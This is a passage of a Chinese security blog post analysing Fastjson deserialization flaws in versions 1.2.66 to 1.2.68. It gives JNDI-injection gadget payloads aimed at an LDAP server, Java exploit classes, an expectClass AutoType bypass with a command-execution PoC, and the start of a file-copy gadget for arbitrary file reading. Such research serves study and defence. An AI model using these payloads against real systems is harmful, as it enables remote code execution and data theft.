<span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>我们在后面的代码中就会执行<code>loadClass</code>方法，最后遍历调用setter与getter方法，最终执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span> &amp;&amp; (autoTypeSupport || jsonType || expectClassFlag)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, cacheClass);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h3 id="vwjWL">补丁</h3>
黑名单绕过的补丁都是在新版本中向hash黑名单中添加相应的hash

<p>新版本运行后会抛出以下异常</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="iFdOH">1.2.66 反序列化漏洞</h2>
1.2.66 反序列化，有着三条Gadget，其原理都为JNDI注入，也需要服务端存在其他依赖

<h3 id="Z4itN">1.2.66反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.66；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
</ul>
<h3 id="edTnh">Gadget's POC</h3>
<h4 id="LH9SG">org.apache.shiro.realm.jndi.JndiRealmFactory</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;Realms&quot;</span>:[<span class="string">&quot;&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="x7M85">br.com.anteros.dbcp.AnterosDBCPConfig</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">或</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SRgjI">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="string">&quot;properties&quot;</span>: &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.util.Properties&quot;</span>,<span class="string">&quot;UserTransaction&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="KVFVy">EXP</h3>
EXP如下，记得开启AutoTypeSupport

<p>这几个Gadget都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1266</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span></span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="yVPEG">1.2.67反序列化漏洞</h2>
<h3 id="lOtJF">1.2.67反序列化前提条件</h3>

<ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.67；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
</ul>
<h3 id="gTkXQ">Fastjson循环引用</h3>
Fastjson支持循环引用，且默认开启

<p>参考如下</p>
<p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p>
<p>在Fastjson中，向JsonArray类型的对象里面add数据时，如果数据相同，那么就会被替换成$ref，相当于定义了一下以便简化，因为数据也是一样的</p>
<p>$ref即循环引用：当一个对象包含另一个对象时，Fastjson会将$ref解析成引用</p>
<table>
<thead>
<tr>
<th align="center">语法</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$”}</font></td>
<td align="center">引用根对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”@”}</font></td>
<td align="center">引用自己</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..”}</font></td>
<td align="center">引用父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”..&#x2F;..”}</font></td>
<td align="center">引用父对象的父对象</td>
</tr>
<tr>
<td align="center"><font style="color:rgb(51, 51, 51);">{“$ref”:”$.members[0].reportTo”}</font></td>
<td align="center"><font style="color:rgb(51, 51, 51);">基于路径的引用</font></td>
</tr>
</tbody></table>
<p>那这样就清楚了，org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC中后面那段的{“$ref”:”$.tm”}，实际上就是基于路径的引用，相当于是调用root.getTm()函数，进而直接调用了tm字段的getter方法了</p>
<h3 id="xOPlY">Gadget's POC</h3>
<h4 id="AzrMp">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="QCent">org.apache.shiro.jndi.JndiObjectFactory</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sxkNl">EXP</h3>
EXP如下，其实并没有什么差别，还是那句话，记得开启AutoTypeSupport

<p>这几个Gadget也都十分简单，不在过多分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP_1267</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line"> JSON.parse(poc);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pJcT1">1.2.68反序列化漏洞（expectClass绕过AutoType）</h2>
<h3 id="adqSF">1.2.68反序列化前提条件</h3>

<ul>
<li>Fastjson &lt;&#x3D; 1.2.68</li>
<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中</li>
</ul>
<h3 id="JLOJQ">绕过</h3>
<h4 id="b7fNW">绕过原理</h4>

<p>本次绕过的关键处在于<code>checkAutoType()</code>的第二个参数expectClass，我们可以通过构造恶意JSON数据、传入某个类作为exceptClass参数在传入另一个exceptClass的子类或者实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作</p>
<p><strong>步骤如下:</strong></p>
<ul>
<li>先传入某个类，其加载成功后作为exceptClass参数传入<code>checkAutoType</code>函数</li>
<li>查找exceptClass类的实现类或者子类，如果在子类或者实现类中其构造方法或者setter方法中存在危险操作即可利用</li>
</ul>
<h4 id="sFO75">可行性测试</h4>
简单测试一下该绕过方法的可行性

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExcept</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span>  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FastjsonExcept</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        rt.exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.FastjsonExcept&quot;</span>,<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，在无需AutoType的情况下，即可执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="bmimq">断点调试</h4>

<p>我们直接在<code>checkAutoType</code>下断点调试</p>
<p>第一次转入的类是<code>AutoCloseable</code>进行校验，这里我们可以看到expectClass为null</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后从缓存Mapping中直接获取到<code>AutoCloseable</code>，然后对获取的clazz进行了一系列的判断，判断clazz是不是null，以及internalWhite的判断，internalWhite里面的白名单一定是很安全的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续会出现对expectClass的判断，判断expectClass是否为空，且判断它是否继承HashMap类，若满足情况，则抛出异常，反之则会返回类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>回到<code>DefaultJSONParser</code>后，获取到clazz后再继续执行，根据<code>AutoCloseable</code>类获取到反序列化器为<code>JavaBeanDeserializer</code>使用该反序列化器进行反序列化操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续往里面走，调用<code>JavaBeanDeserializer</code>的<code>deserialze</code>方法，传入的第二个参数type即为<code>AutoCloseable</code>类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>往下面的逻辑，就是解析后面类的过程。这里看到获取不到对象反序列化器后，就会进入到if的判断中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这次我们第二次进入<code>checkAutoType</code>方法，typeName是我们POC中的第二个类，exceptClass参数是POC中指定的第一个类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>因为<code>AutoCloseable</code>并不是黑名单中的类，所以expectClassFlag被设置为true</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后走到我们刚刚说的地方，当这个类不在白名单，且autoType开启或者expectClassFlag为true时，即可进入Auto开启时的检测逻辑</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>往下，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进该函数中，这里使用<code>AppClassLoader</code>加载 <code>VulAutoCloseable</code> 类并直接返回</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>往下，判断其是否为jsonType，若true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常</p>
<p>这也是过滤大多数JNDI注入Gadget的机制</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最重点的是以下部分，这里当expectClass不为null时，就会判断我们的clazz是否为expectClass的子类，若它继承与expectClass的话，就会被添加到Mapping缓存中并返回该目标类，反之则抛出异常</p>
<p>这里解释的我们的恶意类必须要继承自expectClass类，只有目标类是expectClass类的子类时，才能通过这里的判断，后续反序列化即可造成恶意代码的执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="BWFH9">小结</h4>

<blockquote>
<p>在我们的POC中定义了两个<code>@type</code></p>
</blockquote>
<p>第一个type进去什么事情都没有发生，它是作为第二个type类的expectClass传入的，而当第二个type类为第一个type的继承类，且他的setter&#x2F;getter或构造方法中存在危险方法时，即可被我们利用</p>
<h3 id="R1wmY">实际利用</h3>
我实在太菜了，不会自己寻找gadget，这里就直接从别的师傅那里看存在漏洞的地方了 嘤嘤嘤

<p>找到的是IntputStream和OutputStream，他们都是实现自AutoCloseable接口的</p>
<h4 id="h09Z1">复制文件（任意文件读取）</h4>
利用类：org.eclipse.core.internal.localstore.SafeFileOutputStream

<p>依赖：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看一下<code>SafeFileOutputStream</code>的源代码，在他的构造函数<code>public SafeFileOutputStream(String targetPath, String tempPath)</code>中，若targetPath文件不存在，且tempPath文件存在，就会把tempPath复制到targetPath中</p>
<p>利用其构造函数，我们可以实现特定web场景下的任意文件读取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.eclipse.core.internal.localstore;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.utils.FileUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var2;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    ((OutputStream)destination).close();</span><br><span class="line">                &#125; <span 